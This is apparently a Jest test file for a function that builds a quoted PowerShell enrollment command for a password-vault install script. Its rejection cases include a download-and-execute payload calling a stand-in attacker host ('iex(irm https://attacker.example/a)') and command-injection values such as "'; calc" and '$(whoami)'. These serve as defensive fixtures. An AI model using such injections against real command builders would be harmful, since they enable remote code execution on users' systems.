import { installCommand } from "./install-command";

const script = "Install-PassBundle.ps1";
const token = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJ0123-_6";

describe("installCommand", () => {
  it("quotes the server and the token", () => {
    expect(installCommand(script, "https://vault.example.com/", token)).toBe(
      `.\\Install-PassBundle.ps1 -ServerUrl 'https://vault.example.com' -EnrollmentToken '${token}'`,
    );
  });

  it("carries the join secret and the organization's key fingerprint, checked and quoted", () => {
    const parts = { secret: token.replace("a", "s"), fingerprint: token.replace("a", "f") };
    expect(installCommand(script, "https://vault.example.com", token, parts)).toBe(
      `.\\Install-PassBundle.ps1 -ServerUrl 'https://vault.example.com' -EnrollmentToken '${token}' -JoinSecret '${parts.secret}' -OrgKey '${parts.fingerprint}'`,
    );
    expect(
      installCommand(script, "https://vault.example.com", token, { ...parts, secret: "x'; calc" }),
    ).toBeNull();
    expect(
      installCommand(script, "https://vault.example.com", token, { ...parts, fingerprint: "" }),
    ).toBeNull();
  });

  it("takes a port, a path, and an IPv6 address", () => {
    expect(installCommand(script, "https://127.0.0.1:8443/vault", token)).toContain(
      "-ServerUrl 'https://127.0.0.1:8443/vault'",
    );
    expect(installCommand(script, "https://[::1]:8443", token)).toContain(
      "-ServerUrl 'https://[::1]:8443'",
    );
  });

  it.each([
    "x; iex(irm https://attacker.example/a)",
    `${token.slice(0, 42)}'`,
    `${token} `,
    `${token}$(whoami)`,
    token.slice(0, 42),
    `${token}A`,
    "",
  ])("refuses a token that isn't one: %p", (bad) => {
    expect(installCommand(script, "https://vault.example.com", bad)).toBeNull();
  });

  it.each([
    "http://vault.example.com",
    "https://vault.example.com/'; calc; '",
    "https://vault.example.com/’; calc; ‘",
    "https://vault.example.com/a b",
    "https://vault.example.com/?x=1",
    "https://vault.example.com/$(whoami)",
    "https://",
  ])("refuses a server address that isn't plain HTTPS: %p", (bad) => {
    expect(installCommand(script, bad, token)).toBeNull();
  });

  it("refuses a script name that isn't one", () => {
    expect(installCommand("x; calc; .ps1", "https://vault.example.com", token)).toBeNull();
    expect(installCommand("Install.exe", "https://vault.example.com", token)).toBeNull();
  });
});
